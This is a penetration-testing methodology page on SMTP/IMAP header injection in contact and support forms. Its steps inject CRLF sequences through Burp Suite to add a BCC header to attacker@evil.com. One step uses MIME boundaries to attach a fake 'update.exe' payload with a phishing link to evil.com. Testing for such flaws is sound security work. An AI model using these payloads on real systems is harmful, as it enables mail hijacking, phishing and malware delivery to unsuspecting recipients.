# IMAP SMTP Injection

## Check List

## Methodology

### Black Box

#### Email field

{% stepper %}
{% step %}
Navigate to email-sending features such as `Contact Us`, `Support`, `Feedback`, `Send Message`, or Invite User forms It's like paths `/contact`, `/support`, `/feedback`, `/send-email`, or `/ask`
{% endstep %}

{% step %}
Fill in the input fields like `email`, `name`, `subject`, and `message` with normal values, then intercept the request using Burp Suite
{% endstep %}

{% step %}
Locate user-controlled fields in the intercepted request (`email=gupta@gmail.com`, `name=Bless, message=Hello`)
{% endstep %}

{% step %}
Inject CRLF (`%0d%0a` or `\r\n`) into any field to insert a new email header

```
email=gupta@gmail.com%0d%0abcc:attacker@evil.com
```
{% endstep %}

{% step %}
Forward the modified request and check your attacker-controlled inbox (`attacker@evil.com`). If you receive a copy of the email with the injected header, injection is confirmed and Look for `BCC`/`CC` in received mail
{% endstep %}

{% step %}
similar endpoints like `/notify`, `/share`, `/invite`, `/ticket`, or `/api/mail`
{% endstep %}
{% endstepper %}

***

#### Reflected In The Confirmation Email or Response

{% stepper %}
{% step %}
Navigate to any email-sending form such as Contact Us, Support, Feedback, Get in Touch, Send Message, or Report Issue
{% endstep %}

{% step %}
l in the form with normal values Then intercept the request using Burp Suite.\
Capture the full `POST/GET` request to `/contact` or `/send`
{% endstep %}

{% step %}
Check if the email field is reflected in the confirmation email or response. If yes, proceed to injection testing
{% endstep %}

{% step %}
Inject `CRLF + BCC` into the email field to receive a blind copy

```
email=victim@company.com%0d%0abcc:attacker@evil.com
```
{% endstep %}

{% step %}
Forward the request and check `attacker@evil.com` if you receive the email, injection confirmed
{% endstep %}

{% step %}
Try malware attachment injection using MIME boundaries

```http
email=victim@company.com%0d%0a
content-type:multipart/mixed; boundary="XYZ"%0d%0a
%0d%0a--XYZ%0d%0a
content-type:text/plain%0d%0a
Your account needs verification: https://evil.com%0d%0a
--XYZ%0d%0a
content-type:application/octet-stream; name="update.exe"%0d%0a
content-disposition:attachment; filename="update.exe"%0d%0a
[base64-encoded payload or dummy data]%0d%0a
--XYZ--
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
